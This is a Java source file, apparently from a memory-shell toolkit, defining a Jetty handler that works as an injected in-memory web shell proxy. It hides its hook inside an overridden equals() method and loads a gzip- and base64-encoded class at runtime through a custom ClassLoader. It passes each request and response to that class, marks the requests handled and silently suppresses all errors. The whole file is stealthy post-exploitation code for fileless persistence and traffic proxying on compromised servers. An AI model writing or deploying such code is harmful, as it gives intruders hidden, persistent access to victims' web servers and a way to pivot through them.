package com.reajason.javaweb.memshell.shelltool.proxy;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.zip.GZIPInputStream;

public class ProxyJettyAgentHandler extends ClassLoader {
    private static volatile Class<?> proxyHttpClass;
    private static String proxyHttpGZipBase64;

    public ProxyJettyAgentHandler() {
    }

    public ProxyJettyAgentHandler(ClassLoader parent) {
        super(parent);
    }

    @Override
    public boolean equals(Object obj) {
        Object[] args = ((Object[]) obj);
        Object baseRequest = null;
        Object request;
        Object response;
        if (args.length == 4) {
            Object arg4 = args[3];
            baseRequest = args[1];
            if (arg4 instanceof Integer) {
                // jetty6
                request = args[1];
                response = args[2];
            } else {
                request = args[2];
                response = args[3];
            }
        } else {
            // ee10
            request = args[0];
            response = args[1];
        }
        try {
            if (getProxyHttpClass().newInstance().equals(new Object[]{request, response})) {
                if (baseRequest != null) {
                    baseRequest.getClass().getMethod("setHandled", boolean.class).invoke(baseRequest, true);
                }
                return true;
            }
        } catch (Throwable ignored) {
        }
        return false;
    }

    private static Class<?> getProxyHttpClass() throws Exception {
        if (proxyHttpClass == null) {
            synchronized (ProxyJettyAgentHandler.class) {
                if (proxyHttpClass == null) {
                    byte[] bytes = gzipDecompress(decodeBase64(proxyHttpGZipBase64));
                    proxyHttpClass = new ProxyJettyAgentHandler(Thread.currentThread().getContextClassLoader())
                            .defineClass(bytes, 0, bytes.length);
                }
            }
        }
        return proxyHttpClass;
    }

    @SuppressWarnings("all")
    private static byte[] decodeBase64(String value) throws Exception {
        try {
            Class<?> decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, value);
        } catch (Throwable e) {
            Class<?> decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class)
                    .invoke(decoderClass.newInstance(), value);
        }
    }

    private static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream input = new GZIPInputStream(new ByteArrayInputStream(compressedData));
        try {
            byte[] buffer = new byte[4096];
            int count;
            while ((count = input.read(buffer)) > 0) {
                out.write(buffer, 0, count);
            }
            return out.toByteArray();
        } finally {
            input.close();
            out.close();
        }
    }
}
